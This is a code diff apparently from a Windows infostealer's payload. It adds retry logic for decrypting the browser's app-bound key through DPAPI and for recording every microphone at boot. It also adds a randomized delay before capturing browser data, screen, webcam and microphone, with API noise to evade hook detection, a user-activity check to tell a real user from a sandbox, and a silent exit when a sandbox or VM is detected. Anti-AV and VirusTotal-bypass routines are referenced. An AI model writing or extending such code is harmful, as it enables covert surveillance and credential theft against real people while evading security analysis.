@@ -1233,15 +1233,26 @@ static std::vector<BYTE> getAppBoundKeyAdmin(const std::string& userDataRoot) {
         blobLen -= 4;
     }
 
-    auto step1 = dpapiDecryptAsSystem(blob, blobLen);
-    if (step1.empty()) {
-        step1 = dpapiDecrypt(blob, blobLen);
-        if (step1.empty()) return {};
+    // Retry up to 5 times with increasing delays — DPAPI may not be ready at boot
+    for (int attempt = 0; attempt < 5; attempt++) {
+        if (attempt > 0)
+            Sleep((DWORD)(2000 + attempt * 1500));
+
+        auto step1 = dpapiDecryptAsSystem(blob, blobLen);
+        if (step1.empty()) {
+            step1 = dpapiDecrypt(blob, blobLen);
+            if (step1.empty()) continue;
+        }
+        auto step2 = dpapiDecrypt(step1.data(), (DWORD)step1.size());
+        if (step2.empty()) {
+            auto key = extractAppBoundKeyBytes(step1);
+            if (!key.empty()) return key;
+            continue;
+        }
+        auto key = extractAppBoundKeyBytes(step2);
+        if (!key.empty()) return key;
     }
-    auto step2 = dpapiDecrypt(step1.data(), (DWORD)step1.size());
-    if (step2.empty())
-        return extractAppBoundKeyBytes(step1);
-    return extractAppBoundKeyBytes(step2);
+    return {};
 }
 
 // IElevator COM path disabled: wrong vtable offsets crash (0xC0000005).
@@ -2496,7 +2507,13 @@ static std::vector<std::pair<std::string, std::vector<char>>> recordAllMicrophon
 
     std::vector<std::pair<std::string, std::vector<char>>> result;
 
-    UINT n = waveInGetNumDevs();
+    // At boot, audio services may not be ready — retry up to 8 times (total ~30s)
+    UINT n = 0;
+    for (int retry = 0; retry < 8; retry++) {
+        n = waveInGetNumDevs();
+        if (n > 0) break;
+        if (retry < 7) Sleep(4000);
+    }
     for (UINT d = 0; d < n; d++) {
         WAVEINCAPSA caps = {};
         std::string name = "wavein_" + std::to_string(d);
@@ -3375,6 +3392,46 @@ static void applyVTBypass() {
     }
 }
 
+// === Feature: Randomized delay before data capture ===
+// Delays heavy data collection (browser, screen, webcam, mic) by a random
+// interval so the payload doesn't start grabbing immediately at predictable
+// moments (boot, auto-start, update-hit).
+
+static void randomDelayBeforeCapture() {
+    DWORD totalDelay = 30000 + (rand() % 150000); // 30-180 seconds
+    DWORD steps = 15 + (rand() % 10);
+    DWORD stepDelay = totalDelay / steps;
+
+    for (DWORD i = 0; i < steps; i++) {
+        if (i % 3 == 0) {
+            Sleep(stepDelay);
+        } else if (i % 3 == 1) {
+            HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
+            if (hEvent) {
+                WaitForSingleObject(hEvent, stepDelay);
+                CloseHandle(hEvent);
+            } else {
+                Sleep(stepDelay);
+            }
+        } else {
+            SleepEx(stepDelay, FALSE);
+        }
+
+        // Diverse API calls to avoid simple hook detection
+        GetTickCount();
+        GetTickCount64();
+        LARGE_INTEGER pc;
+        QueryPerformanceCounter(&pc);
+        char buf[64];
+        DWORD sz = sizeof(buf);
+        GetComputerNameA(buf, &sz);
+
+        // If user is active, proceed immediately (real user, not sandbox)
+        if (hasUserActivity())
+            break;
+    }
+}
+
 // === Info collection ===
 
 static std::string collectInfo(const PayloadConfig& cfg, bool isUpdate) {
@@ -3467,6 +3524,10 @@ static PayloadConfig loadConfig() {
 }
 
 static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal) {
+    // 0) Sandbox/VM check FIRST — exit silently before any network activity
+    if (isInSandbox())
+        return;
+
     if (dumpLocal)
         clearResultDir();
 
@@ -3492,6 +3553,9 @@ static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal) {
         runAntiAV();
     if (cfg.bypassVT)
         applyVTBypass();
+
+    // Randomized delay before heavy data capture — avoids predictable timing at boot/auto-start/update-hit
+    randomDelayBeforeCapture();
 
     std::string password = generatePassword();
     std::vector<std::pair<std::string, std::vector<char>>> archiveFiles;
